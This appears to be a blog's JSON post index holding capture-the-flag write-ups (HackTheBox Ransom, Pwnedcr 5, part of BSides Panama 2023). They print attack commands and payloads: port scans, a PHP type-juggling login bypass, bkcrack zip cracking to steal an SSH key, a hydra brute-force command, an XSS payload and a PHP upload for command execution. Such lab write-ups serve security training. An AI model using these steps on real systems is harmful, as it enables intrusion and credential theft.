[
  
    
      {
        "title"    : "Ransom",
        "category" : "HTB",
        "tags"     : "HTB, Easy",
        "url"      : "/htb/ransom",
        "date"     : "2022-11-24 00:00:00 -0600",
        "content": "<p><img src=\"/assets/img/ransom/ransom.jpg\" width=\"600\" /></p>\n\n<h3 id=\"phases\">Phases:</h3>\n\n<ul>\n  <li>Recognition.</li>\n  <li>Intrusion.</li>\n  <li>Privilege escalation.</li>\n</ul>\n\n<h1 id=\"recognition\">Recognition:</h1>\n\n<p>We start the recognition by knowing the OS and if the vuln machine is online with the following command:</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">ping</span> <span class=\"o\">-</span><span class=\"n\">c</span> <span class=\"mi\">1</span> <span class=\"mf\">10.10</span><span class=\"o\">.</span><span class=\"mf\">10.10</span> \n</code></pre></div></div>\n\n<p><img src=\"/assets/img/ransom/1.png\" width=\"600\" /></p>\n\n<p>With that command, we send an ICMP package and if the <em>TTL</em> is in a range of 64 is a Linux machine and if it is in a range of 128 is a Windows machine. In this case, we are against a <em>Linux</em> machine.</p>\n\n<p>The next step that we are going to perform is a scan with <strong>Nmap</strong> to search for open ports in the victim machine with the next command:</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> <span class=\"n\">sudo</span> <span class=\"n\">nmap</span> <span class=\"o\">-</span><span class=\"nb\">p</span><span class=\"o\">-</span> <span class=\"o\">-</span><span class=\"n\">sS</span> <span class=\"o\">--</span><span class=\"nb\">open</span> <span class=\"o\">--</span><span class=\"n\">min</span><span class=\"o\">-</span><span class=\"n\">rate</span> <span class=\"mi\">5000</span> <span class=\"o\">-</span><span class=\"n\">n</span> <span class=\"o\">-</span><span class=\"n\">v</span> <span class=\"o\">-</span><span class=\"no\">Pn</span> <span class=\"mf\">10.10</span><span class=\"o\">.</span><span class=\"mf\">11.153</span> <span class=\"o\">-</span><span class=\"n\">oG</span> <span class=\"n\">allPorts</span>\n</code></pre></div></div>\n\n<ul>\n  <li>-p –&gt; This will search all the ports in the victim machine.</li>\n  <li>-sS –&gt; This will do a TCP-SYC scan that only makes half the connection of the three-way handshake with the target. (This will scan the target very fast).</li>\n  <li>–open –&gt; It will only report the open ports.</li>\n  <li>–min-rate 5000 –&gt; It will send 5000 packages per second.</li>\n  <li>-n –&gt; It won’t do a DNS scan.</li>\n  <li>-Pn –&gt; This won’t do an ARP host resolution scan.</li>\n  <li>-oG –&gt; This will save the scanned ports in a regex format to then use a script to get the ports more quickly and do a more intense scan.</li>\n</ul>\n\n<p>We extract the ports of the file <em>allPorts</em> with the following script. You must put it in your <em>.zshrc</em> or  <em>.bashrc</em> and install <em>xclip</em>. (The owner of this script is <em>S4vitar</em>.)</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">function</span> <span class=\"n\">extractPorts</span><span class=\"p\">(){</span>\n\t<span class=\"n\">ports</span><span class=\"o\">=</span><span class=\"s2\">\"$(cat $1 | grep -oP '</span><span class=\"se\">\\d</span><span class=\"s2\">{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')\"</span>\n\t<span class=\"n\">ip_address</span><span class=\"o\">=</span><span class=\"s2\">\"$(cat $1 | grep -oP '</span><span class=\"se\">\\d</span><span class=\"s2\">{1,3}</span><span class=\"se\">\\.\\d</span><span class=\"s2\">{1,3}</span><span class=\"se\">\\.\\d</span><span class=\"s2\">{1,3}</span><span class=\"se\">\\.\\d</span><span class=\"s2\">{1,3}' | sort -u | head -n 1)\"</span>\n\t<span class=\"n\">echo</span> <span class=\"o\">-</span><span class=\"n\">e</span> <span class=\"s2\">\"</span><span class=\"se\">\\n</span><span class=\"s2\">[*] Extracting information...</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span> <span class=\"o\">&gt;</span> <span class=\"n\">extractPorts</span><span class=\"p\">.</span><span class=\"nf\">tmp</span>\n\t<span class=\"n\">echo</span> <span class=\"o\">-</span><span class=\"n\">e</span> <span class=\"s2\">\"</span><span class=\"se\">\\t</span><span class=\"s2\">[*] IP Address: $ip_address\"</span>  <span class=\"o\">&gt;&gt;</span> <span class=\"n\">extractPorts</span><span class=\"p\">.</span><span class=\"nf\">tmp</span>\n\t<span class=\"n\">echo</span> <span class=\"o\">-</span><span class=\"n\">e</span> <span class=\"s2\">\"</span><span class=\"se\">\\t</span><span class=\"s2\">[*] Open ports: $ports</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span>  <span class=\"o\">&gt;&gt;</span> <span class=\"n\">extractPorts</span><span class=\"p\">.</span><span class=\"nf\">tmp</span>\n\t<span class=\"n\">echo</span> <span class=\"s2\">\"nmap -sCV -p$ports -oN targeted \"</span> <span class=\"o\">|</span> <span class=\"n\">tr</span> <span class=\"o\">-</span><span class=\"n\">d</span> <span class=\"s1\">'\\n'</span> <span class=\"o\">|</span> <span class=\"n\">xclip</span> <span class=\"o\">-</span><span class=\"n\">sel</span> <span class=\"n\">clip</span>\n\t<span class=\"n\">echo</span> <span class=\"o\">-</span><span class=\"n\">e</span> <span class=\"s2\">\"[*] Ports copied to clipboard</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span>  <span class=\"o\">&gt;&gt;</span> <span class=\"n\">extractPorts</span><span class=\"p\">.</span><span class=\"nf\">tmp</span>\n\t<span class=\"n\">cat</span> <span class=\"n\">extractPorts</span><span class=\"p\">.</span><span class=\"nf\">tmp</span><span class=\"p\">;</span> <span class=\"n\">rm</span> <span class=\"n\">extractPorts</span><span class=\"p\">.</span><span class=\"nf\">tmp</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n\n<p>We do a <strong>ctrl + v</strong> to paste the following command and only need to put the IP address.</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> <span class=\"n\">sudo</span> <span class=\"n\">nmap</span> <span class=\"o\">-</span><span class=\"n\">p80</span><span class=\"p\">,</span><span class=\"mi\">22</span> <span class=\"o\">-</span><span class=\"n\">sCV</span> <span class=\"mf\">10.10</span><span class=\"o\">.</span><span class=\"mf\">11.153</span> <span class=\"o\">-</span><span class=\"n\">oN</span> <span class=\"no\">Targeted</span> \n</code></pre></div></div>\n\n<ul>\n  <li>-sCV –&gt; This will show the version of the services running in the target’s open ports. Also, it will show us some vulnerabilities that we could exploit if it finds some.</li>\n</ul>\n\n<p><img src=\"/assets/img/ransom/2.png\" width=\"600\" /></p>\n\n<p>This scan doesn’t give us much information. :(</p>\n\n<p>We see port 80 open, so we do the following to get more info:</p>\n\n<ul>\n  <li><strong>whatweb 10.10.11.153</strong></li>\n</ul>\n\n<p>This will show us the version of CMS and more information that could be useful for further steps. (Also, we could use the addon named Wappalizer in our web browser.) with this, we see the web redirecting to a <em>/login</em> page; viewing the page is asking for a password we don’t have.</p>\n\n<p><img src=\"/assets/img/ransom/3.png\" width=\"600\" /></p>\n\n<p>The web looks like this:</p>\n\n<p><img src=\"/assets/img/ransom/7.png\" width=\"600\" /></p>\n\n<p>We tried slqi, but no luck :(</p>\n\n<p>We tried <em>fuzzing</em> the web but nothing interesting.</p>\n\n<p>We open <strong>burpsuite</strong> to look at what is sending and if we can exploit some parameters.</p>\n\n<p>We see that the data we provide like the password, is being sent to a <em>/api/login</em>. If we change the request method to <em>POST</em> and send it, we get an error of <strong><em>method not allowed</em></strong>, and now we see that the <em>password field</em> is now on the lower part of the request.</p>\n\n<p><img src=\"/assets/img/ransom/4.png\" width=\"600\" /></p>\n\n<p>If we change the method again to <em>GET</em>, but with the password on the lower part of the request, we get a different error, but this is time indicating <strong>unprocessable content</strong>.</p>\n\n<p><img src=\"/assets/img/ransom/5.png\" width=\"600\" /></p>\n\n<p>In the response, we see that the content-type is using a <em>json format</em> so we put it like this:</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">{</span>\n <span class=\"s2\">\"password\"</span><span class=\"p\">:</span> <span class=\"s2\">\"test\"</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p>And also, we need to change the content-type to <strong>application/json</strong> in our request.</p>\n\n<p><img src=\"/assets/img/ransom/6.png\" width=\"600\" /></p>\n\n<p>And this time we get an error indicating that the password is incorrect, but we are going in a rigth way :)</p>\n\n<h2 id=\"intrusion\">Intrusion:</h2>\n\n<p>Searching for ways to exploit the page, we get this article: <a href=\"https://www.invicti.com/blog/web-security/php-type-juggling-vulnerabilities/\" title=\"Type juggling attack\">Link</a> it tells us that we can bypass the password input, providing a boolean.</p>\n\n<p>So we pass a bolean in our json format password input.</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">{</span>\n <span class=\"s2\">\"password\"</span><span class=\"p\">:</span> <span class=\"kp\">true</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n\n<p>This way we get access to the page :)</p>\n\n<p>We see the user flag and a zip file.</p>\n\n<p>We download the zip file and use <strong>unzip</strong> to try to decompress it but we need to provide a password and for now we don’t have it, so I used <strong>zip2john</strong> and <em>fcrackzip</em> to try to crack it but none of this work.</p>\n\n<p>We start to search for more information about the zip, we can use <strong>7z l uploaded-file-3422.zip</strong> to see the content of the file, the file contents a id_rsa that we could use to connect to the victim machine, we use <strong>7z l uploaded-file-3422.zip -slt</strong> to get even more information.</p>\n\n<p><img src=\"/assets/img/ransom/8.png\" width=\"600\" /></p>\n\n<p>This will list more attributes of the zip files and we see that the method is <strong>ZipCrypto Deflate</strong> searching for this method and how to crack a zip file we see an interesting post: <a href=\"https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8\" title=\"How I Cracked CONTI Ransomware Group’s Leaked Source Code ZIP File\">Link</a></p>\n\n<p>This attack can be used to crack the zip file, but we need a similar/same file that is in the encrypted zip and also that we have the content without encryption, looking at the previous image, we see a <strong><em>.bash_logout</em></strong> file and searching in our machine we find a file named like it, and maybe it could be the same, to make sure we can compare the size, we can do this with the command <strong>wc -c bash_logout</strong> and we see that the size is the same as on the previous image that is <strong>220</strong> same as the encrypted file:</p>\n\n<p><img src=\"/assets/img/ransom/9.png\" width=\"600\" /></p>\n\n<p>Link of the tool: <a href=\"https://github.com/kimci86/bkcrack\" title=\"bkcrack tool\">Link</a></p>\n\n<p>So we can do the following to perform the attack:</p>\n\n<p>First, we clone the tool with the command <strong>git clone https://github.com/kimci86/bkcrack</strong> and install it, then we go where the executable is, and there we are going to copy the <strong>encrypted zip</strong> and the <strong>.bash_logout</strong> that we have in plain text, to then do the this:</p>\n\n<p>We create a zip with the <strong>.bash_logout</strong> that we have in plain text:</p>\n\n<p><strong>zip plain.zip .bash_logout</strong></p>\n\n<p>Then we do this:</p>\n\n<p><img src=\"/assets/img/ransom/10.png\" width=\"600\" /></p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">bkcrack</span> <span class=\"o\">-</span><span class=\"no\">C</span> <span class=\"n\">uploaded</span><span class=\"o\">-</span><span class=\"n\">file</span><span class=\"o\">-</span><span class=\"mi\">3422</span><span class=\"p\">.</span><span class=\"nf\">zip</span> <span class=\"o\">-</span><span class=\"n\">c</span> <span class=\"s2\">\".bash_logout\"</span> <span class=\"o\">-</span><span class=\"no\">P</span> <span class=\"n\">plain</span><span class=\"p\">.</span><span class=\"nf\">zip</span> <span class=\"o\">-</span><span class=\"nb\">p</span> <span class=\"s2\">\"bash_logout\"</span>\n</code></pre></div></div>\n\n<p>We pass the <em>uploaded-file-3422.zip</em> and also indicate the file’s name in the encrypted zip file that we have the copy in plain text.</p>\n\n<p>Then we pass the zip file we created with the <strong>bash_logout</strong> that we have in plain text. (It could be other names, it doesn’t matter what matter is the content that needs to be the same or very identical)</p>\n\n<p>Then we need to wait until it gives us the keys that we could use to get the content of the encrypted file.</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">bkcrack</span> <span class=\"o\">-</span><span class=\"no\">C</span> <span class=\"vg\">$encrypted_zip_file</span> <span class=\"o\">-</span><span class=\"n\">k</span> <span class=\"vg\">$key</span> <span class=\"vg\">$key</span> <span class=\"vg\">$key</span> <span class=\"o\">-</span><span class=\"no\">U</span> <span class=\"n\">new</span><span class=\"p\">.</span><span class=\"nf\">zip</span> <span class=\"n\">password</span>\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/ransom/11.png\" width=\"600\" /></p>\n\n<p>We created a new zip file with a password that is <em>“password”</em> and will have the duplicated files as <em>uploaded-file-3422.zip</em> thanks to the three keys we get.</p>\n\n<p>And then, we decrypt it with the password we put and get the content.</p>\n\n<p>We get the <em>id_rsa</em>, but we need a user. To get the user see the <em>id_rsa.pub</em>, and the user is <em>htb</em>.</p>\n\n<p>So now we put the permissions to the id_rsa <em>chmod 600 id_rsa</em> and connect to the machine <strong>ssh -i id_rsa htb@101.01.01.101</strong></p>\n\n<h2 id=\"privelege-escalation\">Privelege escalation</h2>\n\n<p>In the web page we see that there is a login requesting a password and maybe that password could be reuse for the root user, so we start to search, but in the standard path “/var/www/html” there is nothing.</p>\n\n<p>When we used <strong>whatweb</strong>, we saw that the page is using apache and knowing that we could search this path <strong>/etc/apache2/default/sites-enabled/000-default.conf</strong> to get information, and in fact, we see the root page is in the route <em>/srv/prod/public</em>.</p>\n\n<p><img src=\"/assets/img/ransom/12.png\" width=\"600\" /></p>\n\n<p>We go to the path and start looking for where password could be, but there are too many files to explore, to decrease the scope do this:</p>\n\n<p>You need to be in this path: <em>/srv/prod/</em></p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">grep</span> <span class=\"o\">-</span><span class=\"n\">r</span> <span class=\"n\">login</span>\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/ransom/13.png\" width=\"600\" /></p>\n\n<p>And we find a login string that looks interesting “<strong>routes/api.php</strong>”.</p>\n\n<p>Viewing the <em>api.php</em> we see something interesting “<strong>AuthController::class</strong>”.</p>\n\n<p><img src=\"/assets/img/ransom/14.png\" width=\"600\" /></p>\n\n<p>Viewing the file “<strong>app/Http/Controllers/AuthController.php</strong>” we get the password.</p>\n\n<p><img src=\"/assets/img/ransom/15.png\" width=\"600\" /></p>\n\n<p>We test it with the root user and that’s his password.</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">su</span> <span class=\"n\">root</span>\n</code></pre></div></div>\n\n<p>And now we are root :)</p>\n"
      } ,
    
      {
        "title"    : "Pwnedcr 5",
        "category" : "Pwnedcr",
        "tags"     : "Pwnedcr5, Easy",
        "url"      : "/pwnedcr/Pwnedcr-5",
        "date"     : "2022-12-08 00:00:00 -0600",
        "content": "<p><img src=\"/assets/img/pwnedcr5/pwnedcr-5.png\" width=\"800\" /></p>\n\n<h3 id=\"retos\">Retos:</h3>\n\n<ul>\n  <li>El regalo</li>\n  <li>Cryptonita</li>\n  <li>Tron</li>\n  <li>Enumérame</li>\n  <li>Bruto el fuerte</li>\n  <li>Siete a cero</li>\n  <li>Scripteando</li>\n</ul>\n\n<h1 id=\"el-regalo\">El regalo:</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/1.png\" width=\"600\" /></p>\n\n<p>Nos dan una cadena de caracteres que se parece a una cadena encodeada en base64.</p>\n\n<p>Sabiendo esto, podemos intentar de decodificarlo desde una terminal de la siguiente manera:</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">echo</span> <span class=\"s2\">\"UFdORURDUnt2ZW5pbW9zX2VuX3Bhel9naGVpQDkwJCN9\"</span> <span class=\"o\">|</span> <span class=\"n\">base64</span> <span class=\"o\">-</span><span class=\"n\">d</span><span class=\"p\">;</span> <span class=\"n\">echo</span>\n</code></pre></div></div>\n<p>De esta manera obtenemos la flag: <strong>PWNEDCR{venimos_en_paz_ghei@90$#}</strong></p>\n\n<p>De una manera alternativa podemos ir a la siguiente pagina <a href=\"https://www.base64decode.org/\" title=\"Base64 decoder\">Link</a> y pegamos nuestra cadena para decodificarla.</p>\n\n<h1 id=\"cryptonita\">Cryptonita:</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/2.png\" width=\"600\" /></p>\n\n<p>Vemos que esta vez no nos dan una cadena, pero si leemos de manera detenida podemos ver una pista, la cual es: “se cree que en ésta página se esta intercambiando información”, esto nos puede decir que la flag puede esta en el codigo fuente de la pagina.</p>\n\n<p>Vamos a ver el codigo fuente y en efecto vemos algo fuera de lo comun casi al final de la pagina, una cadena parecida a la del reto anterior pero esta vez es mucho mas larga.</p>\n\n<p><img src=\"/assets/img/pwnedcr5/3.png\" width=\"600\" /></p>\n\n<p>Vamos a tratar de decodificarlo…</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">echo</span> <span class=\"s2\">\"Tm9zIGVzdOFuIHNpZ3VpZW5kbyBlbCByYXN0cm8sIGhheSBxdWUgYm9ycmFyIHRvZGEgaW5mb3JtYWNp824gYW50ZXMgZGUgcXVlIHNlYSBkZW1hc2lhZG8gdGFyZGUsIGxhcyBjdWVudGFzIGVuIGxvcyBvdHJvcyBwYe1zZXMgZnVlcm9uIGJsb3F1ZWFkYXMsIGxvIPpuaWNvIHF1ZSBub3MgcXVlZGEgZXMgZWwgd2FsbGV0IGRlIGNyeXB0byBtb25lZGFzIHF1ZSBzb2xvIHVzdGVkZXMgeSB5byBzYWJlbW9zIGRvbmRlIGVzdOEsIHJlY3VlcmRlbiB1dGlsaXphciBsYSBwYWxhYnJhIGRlIHBhc28gcGFyYSBwb2RlciBzYWJlciBudWVzdHJvIHBy83hpbW8gcHVudG8gZGUgcmV1bmnzbjogW1sgVUZkT1JVUkRVbnR6WldOMGIzSmZORjloY0dGeWRHRnRaVzUwYjE4Mk5WOTZiMjVoWDI1MVkyeGxZWEpmWkdWellXeHZhbUZrWVY4MUpETXlRREY5IF1d\"</span> <span class=\"o\">|</span> <span class=\"n\">base64</span> <span class=\"o\">-</span><span class=\"n\">d</span><span class=\"p\">;</span> <span class=\"n\">echo</span>\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/pwnedcr5/4.png\" width=\"600\" /></p>\n\n<p>Vemos un mesage curioso y otra cadena que tambien se parece mucho a una cadena en base64, vamos a decodificarla:</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">echo</span> <span class=\"s2\">\"UFdORURDUntzZWN0b3JfNF9hcGFydGFtZW50b182NV96b25hX251Y2xlYXJfZGVzYWxvamFkYV81JDMyQDF9\"</span> <span class=\"o\">|</span> <span class=\"n\">base64</span> <span class=\"o\">-</span><span class=\"n\">d</span><span class=\"p\">;</span> <span class=\"n\">echo</span>\n</code></pre></div></div>\n<p>Con esto ya podemos ver la flag: <strong>PWNEDCR{sector_4_apartamento_65_zona_nuclear_desalojada_5$32@1}</strong></p>\n\n<h1 id=\"tron\">Tron:</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/5.png\" width=\"600\" /></p>\n\n<p>Vemos que nos dan una pista la cual es: “la imagen contiene algún mensaje” y con esto ya nos viene a la mente que puede ser un mensaje fue escondido con esteganografía.</p>\n\n<p>Para analizar la image a un nivel mas bajo podemos utilizar la herramienta: <em>exiftool</em> la cual es una herramienta para ver los metadatos en archivos.</p>\n\n<p>Podemos descargar la imagen y ejecutar el siguiente comando para analizarla.</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">exiftool</span> <span class=\"n\">tron</span><span class=\"p\">.</span><span class=\"nf\">png</span>\n</code></pre></div></div>\n\n<p>Y en efecto vemos bastante informacion y entre ella la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/6.png\" width=\"600\" /></p>\n\n<h1 id=\"enumérame\">Enumérame:</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/7.png\" width=\"600\" /></p>\n\n<p>Nos dan esta pista “reto4.php?id=123” ya podemos pensar en un ataque IDOR (Insecure direct object references) lo que podemos hacer es ir iterando entre numeros, 124, 125, 126…etc.</p>\n\n<p>Poniendo 126 en lugar de 123: “<code class=\"language-plaintext highlighter-rouge\">https://ctf.pwnedcr.com/retos/reto4.php?id=126</code>” ya podemos ver la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/8.png\" width=\"600\" /></p>\n\n<h1 id=\"bruto-el-fuerte\">Bruto el fuerte</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/9.png\" width=\"600\" /></p>\n\n<p>Podemos descargar los dos diccionarios que nos proveen ya que los vamos a utilizar.</p>\n\n<p>Presionando “Abrir app” y nos abre la siguiente ventana:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/10.png\" width=\"600\" /></p>\n\n<p>Nos dan una pista con el titulo ya que se refiere a un “ataque de fuerza bruta”.</p>\n\n<p>Con la herramienta <em>hydra</em> podemos hacer el ataque…</p>\n\n<div class=\"language-ruby highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">hydra</span> <span class=\"o\">-</span><span class=\"no\">L</span> <span class=\"n\">top</span><span class=\"o\">-</span><span class=\"n\">usernames</span><span class=\"o\">-</span><span class=\"n\">shortlist</span><span class=\"p\">.</span><span class=\"nf\">txt</span> <span class=\"o\">-</span><span class=\"no\">P</span> <span class=\"n\">rockyou_top</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"n\">k</span><span class=\"p\">.</span><span class=\"nf\">txt</span> <span class=\"n\">ctf</span><span class=\"p\">.</span><span class=\"nf\">pwnedcr</span><span class=\"p\">.</span><span class=\"nf\">com</span> <span class=\"n\">https</span><span class=\"o\">-</span><span class=\"n\">post</span><span class=\"o\">-</span><span class=\"n\">form</span> <span class=\"s2\">\"/retos/reto5_login.php:username=^USER^&amp;password=^PASS^:F=ACCESS DENIED\"</span>\n</code></pre></div></div>\n\n<p>Uso de <em>hydra</em>:</p>\n\n<ul>\n  <li>-L –&gt; Indicamos que le vamos a pasar un diccionario de <strong>usuarios</strong>.</li>\n  <li>-P –&gt; Indicamos que le vamos a pasar un diccionario de <strong>contraseñas</strong>.</li>\n  <li>ctf.pwnedcr.com –&gt; Es el dominio que vamos a atacar.</li>\n  <li>https-post-form –&gt; Vamos a enviar un formulario que serian el usuario y contraseña.</li>\n  <li>/retos/reto5_login.php –&gt; La ruta donde se ubica el formulario que vamos a atacar.</li>\n  <li>:username=^USER^&amp;password=^PASS^ –&gt; Estos son los campos que vamos a atacar con hydra el username y password, para saber si son diferentes nos podemos fijar en la peticion que estamos enviando por burp o tambien lo podemos ver en el codigo fuente.</li>\n  <li>:F=ACCESS DENIED –&gt; El “ACCESS DENIED” es la palabra que la pagina web nos va a dar si hacemos un intento fallido, el “ACCESS DENIED” lo saque del codigo fuente de la pagina cuando ponemos unas credenciales no validas, lo vemos en la siguiente imagen:</li>\n</ul>\n\n<p><img src=\"/assets/img/pwnedcr5/18.png\" width=\"600\" /></p>\n\n<p>Para mas informacion recomiendo buscar en google ;)</p>\n\n<p>Ejecutamos comando anterior en nuestra terminal y obtenemos un username y un password: admin:jordan23</p>\n\n<p>Y obtenemos la flag.</p>\n\n<p><img src=\"/assets/img/pwnedcr5/17.png\" width=\"600\" /></p>\n\n<h1 id=\"siete-a-cero\">Siete a cero:</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/11.png\" width=\"600\" /></p>\n\n<p>Presionando “Abrir app” y nos abre la siguiente ventana:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/10.png\" width=\"600\" /></p>\n\n<p>Ponemos “test” y “test” y vemos que el output se ve reflejado y pensamos en un ataque xss. (Al principio intente hacer un bypass del login y dure muchas horas y no pude hacer nada y al hacer un xss fue algo irreal.)</p>\n\n<p><img src=\"/assets/img/pwnedcr5/12.png\" width=\"600\" /></p>\n\n<p>Para hacer el ataque xss ponemos: “<strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong>” en la parte del usuario y en la parte del password ponemos lo que querramos.  (“Tiene que ser exactamente igual por que si variamos auque sea el numero, no nos dara la flag”)</p>\n\n<p>y con esto conseguimos la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/13.png\" width=\"600\" /></p>\n\n<h1 id=\"scripteando\">Scripteando:</h1>\n\n<p><img src=\"/assets/img/pwnedcr5/14.png\" width=\"600\" /></p>\n\n<p>No hay muchas pistas pero empezamos con un analizis del codigo fuente de la pagina y vemos algo interesante:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/15.png\" width=\"800\" /></p>\n\n<p>Viendo mas esa linea de codigo podemos notar que ahi esta la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr5/16.png\" width=\"800\" /></p>\n\n"
      } ,
    
      {
        "title"    : "Bsides Panama 2023",
        "category" : "Bsides",
        "tags"     : "Bsides, Medium",
        "url"      : "/bsides/bsides-panama-2023",
        "date"     : "2023-02-01 00:00:00 -0600",
        "content": "<p><img src=\"/assets/img/bsides-panama-2023/banner.png\" width=\"1100\" /></p>\n\n<p>Quiero dar un agradecimiento especial para <code class=\"language-plaintext highlighter-rouge\">Tiz</code> &lt;3 sin él este writeup no hubiera sido posible, dejo por aquí sus redes sociales.</p>\n\n<ul>\n  <li><a href=\"https://twitter.com/cap_tiz\">Twitter</a></li>\n  <li><a href=\"https://www.linkedin.com/in/john-a-kent\">Linkedin</a></li>\n</ul>\n\n<h1 id=\"retos\">Retos:</h1>\n\n<ul>\n  <li><a href=\"#archivo-de-respaldo-webserver\">Archivo de respaldo (WebServer)</a></li>\n  <li><a href=\"#acceso-usuario-webserver\">Acceso usuario (WebServer)</a></li>\n  <li><a href=\"#acceso-administrativo-webserver-ruta-alternativa\">Acceso administrativo (WebServer)</a></li>\n  <li><a href=\"#wordpress-webserver-ruta-alternativa\">Wordpress (WebServer)</a></li>\n  <li><a href=\"#passwordtxt-webserver2\">Password.txt (WebServer2)</a></li>\n  <li><a href=\"#acceso-usuario-webserver2\">Acceso usuario (WebServer2)</a></li>\n  <li><a href=\"#acceso-administrativo-webserver2\">Acceso administrativo (WebServer2)</a></li>\n  <li><a href=\"#plataforma-web-webserver2-ruta-alternativa\">Plataforma WEB (WebServer2)</a></li>\n</ul>\n\n<h1 id=\"topología-de-red\">Topología de red:</h1>\n\n<p><img src=\"/assets/img/bsides-panama-2023/1.png\" width=\"600\" /></p>\n\n<h1 id=\"archivo-de-respaldo-webserver\">Archivo de respaldo (WebServer):</h1>\n\n<p>Iniciamos el CTF, nos dan únicamente la VPN, así que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra dirección IP la máscara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/2.png\" width=\"600\" /></p>\n\n<p>Teniendo esta red podemos empezar a buscar hosts con el siguiente comando:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sudo nmap -sP 10.1.1.1-255\n</code></pre></div></div>\n\n<ul>\n  <li><a>-sp</a> –&gt; Habilita la función de pingsweep.</li>\n</ul>\n\n<p>Podemos notar que encontró un host.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/3.png\" width=\"600\" /></p>\n\n<p>Manos a la obra, vamos a realizar un escaneo más profundo con el siguiente comando:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target\n</code></pre></div></div>\n\n<p>Nos encontró los siguientes puertos:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/4.png\" width=\"600\" /></p>\n\n<p>Empezamos enumerando los puertos del servicio Web.</p>\n\n<p>Utilizando el comando <a>whatweb</a> podemos ver que estamos ante un CentOS y más información sobre la página Web.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/5.png\" width=\"600\" /></p>\n\n<p>Investigando notamos que hay dos servicios Web en los puertos <a>80</a> y <a>65400</a>.</p>\n\n<h1 id=\"servicio-web-en-el-puerto-80\">Servicio Web en el puerto 80:</h1>\n\n<p><img src=\"/assets/img/bsides-panama-2023/6.png\" width=\"600\" /></p>\n\n<p>Al utilizar fuzzing contra esta página podemos encontrar un archivo <a>notes.txt</a> el cual contiene información que nos puede ser útil más adelante:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/7.png\" width=\"600\" /></p>\n\n<p>Y además encontramos una ruta <a>/wordpress</a> la cual contiene una página en WordPress.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/8.png\" width=\"600\" /></p>\n\n<h1 id=\"servicio-web-en-el-puerto-65400\">Servicio Web en el puerto 65400:</h1>\n\n<p>Nos encontramos con una página normal.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/9.png\" width=\"600\" /></p>\n\n<p>Viendo la página Web encontramos un par de credenciales en un post.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/10.png\" width=\"600\" /></p>\n\n<p>Probamos las credenciales contra el panel de administración y estamos dentro como admin.</p>\n\n<p>En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la máquina.</p>\n\n<p>El archivo que subimos fue el siguiente:</p>\n\n<div class=\"language-plaintext 